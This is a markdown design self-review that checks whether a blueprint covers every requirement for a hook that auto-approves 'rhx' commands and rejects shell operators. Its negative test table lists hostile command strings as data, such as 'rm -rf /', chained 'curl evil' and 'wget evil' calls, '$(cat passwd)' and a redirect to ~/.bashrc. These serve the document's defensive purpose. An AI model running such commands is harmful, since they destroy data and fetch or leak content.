# self-review round 7: has-behavior-declaration-coverage

## objective

line-by-line check that every requirement from vision and criteria is addressed in the blueprint.

## vision requirements — line-by-line review

### requirement: "PreToolUse hook that returns permissionDecision: allow"

**vision says**: hook that returns `permissionDecision: "allow"` in the correct JSON structure

**blueprint section**: "output contract (on allow)" shows exact JSON structure with `hookSpecificOutput` wrapper, `hookEventName`, `permissionDecision`, `permissionDecisionReason`

**verdict**: covered

### requirement: "detects rhx command prefixes"

**vision says**: match `rhx`, `npx rhachet run --skill`, etc.

**blueprint section**: "rhx prefix patterns" lists 5 patterns: `rhx`, `npx rhachet run --skill`, `npx rhx`, `./node_modules/.bin/rhx`, `./node_modules/.bin/rhachet`

**verdict**: covered

### requirement: "rejects commands with shell operators outside quotes"

**vision says**: reject pipe, semicolon, `&&`, `||`, `$()`, backticks, `>`, `>>`, `<()`, `>()`, `&`, newlines

**blueprint section**: "dangerous operators" table lists all 12 operators with threat descriptions

**verdict**: covered

### requirement: "quote-aware detection"

**vision says**: operators inside quotes are safe

**blueprint section**: "quote-aware detection" shows sed command to strip quoted content before operator check

**verdict**: covered

### requirement: "fail-safe behavior"

**vision says**: falls back to normal flow on error

**blueprint section**: "codepath tree" shows `exit 0 (pass through)` for all non-allow cases

**verdict**: covered

## criteria usecases — line-by-line review

### usecase.1: rhx commands with special chars run without prompts

| criterion | vision case | blueprint test coverage |
|-----------|-------------|------------------------|
| 1.1 curly braces | P1 | "rhx sedreplace --old '{ identity: x }'" in test coverage |
| 1.2 parentheses | P2 | "rhx sedreplace --old 'foo(bar)'" in test coverage |
| 1.3 square brackets | P3 | "rhx sedreplace --old 'arr[0]'" in test coverage |
| 1.4 pipe in regex | P4 | "rhx grepsafe --pattern 'foo\|bar'" in test coverage |
| 1.5 complex pattern | P5 | "rhx sedreplace --old '{ foo: (x) => y }'" in test coverage |

**verdict**: all 5 positive cases covered

### usecase.2: chained commands are rejected

| criterion | vision case | blueprint test coverage |
|-----------|-------------|------------------------|
| 2.1 pipe chain | N1 | "rhx skill \| curl evil" in test coverage |
| 2.2 semicolon chain | N2 | "rhx skill ; rm -rf /" in test coverage |
| 2.3 AND chain | N3 | "rhx skill && curl evil" in test coverage |
| 2.4 OR chain | N4 | "rhx skill \|\| wget evil" in test coverage |
| 2.5 $() substitution | N5 | "rhx --old \"$(cat passwd)\"" in test coverage |
| 2.6 backtick substitution | N6 | "rhx --old \"\`id\`\"" in test coverage |
| 2.7 newline | N7 | "rhx skill\nevil" in test coverage |
| 2.8 redirect | N8 | "rhx skill > ~/.bashrc" in test coverage |
| 2.9 process substitution | N9 | "rhx skill <(curl evil)" in test coverage |
| 2.10 background exec | N10 | "curl evil & rhx skill" in test coverage |

**verdict**: all 10 negative cases covered

### usecase.3: non-rhx commands are unaffected

| criterion | vision case | blueprint test coverage |
|-----------|-------------|------------------------|
| 3.1 non-Bash tool | E1 | "non-Bash tool → pass-through" in edge cases |
| 3.2 non-rhx command | E3 | "non-rhx command → pass-through" in edge cases |

**verdict**: both edge cases covered

### usecase.4: fail-safe behavior

| criterion | vision case | blueprint test coverage |
|-----------|-------------|------------------------|
| 4.1 hook error | E4 | "malformed JSON → pass-through (fail-safe)" in edge cases |
| 4.2 hook timeout | implied | exit 0 for all non-error cases ensures fail-safe |

**verdict**: covered (E4 explicit, timeout implicit via exit 0)

## issues found

### issue 1: absent E2 in edge cases table?

**observation**: criteria mentions "empty command" scenario but summary appeared to skip E2.

**check against blueprint**: the table shows:
- E1: non-Bash tool
- E2: empty command → pass-through
- E3: non-rhx command
- E4: malformed JSON

**resolution**: E2 is present in blueprint. my initial read of the summary was incomplete.

**verdict**: no issue

## non-issues confirmed

### all positive test cases (P1-P5)

**why it holds**: each case from vision section "positive cases (must allow)" has a matched row in blueprint "test coverage > positive cases"

### all negative test cases (N1-N10)

**why it holds**: each case from vision section "negative cases (must reject)" has a matched row in blueprint "test coverage > negative cases"

### all edge cases (E1-E4)

**why it holds**: blueprint edge cases table covers all scenarios from criteria usecase.3 and usecase.4

### hook registration order

**why it holds**: blueprint explicitly states "add at START of `hooks.onBrain.onTool`" which ensures allow hook runs before block hooks

## conclusion

the blueprint fully covers all behavior declarations from vision and criteria. no gaps found in r7 review.
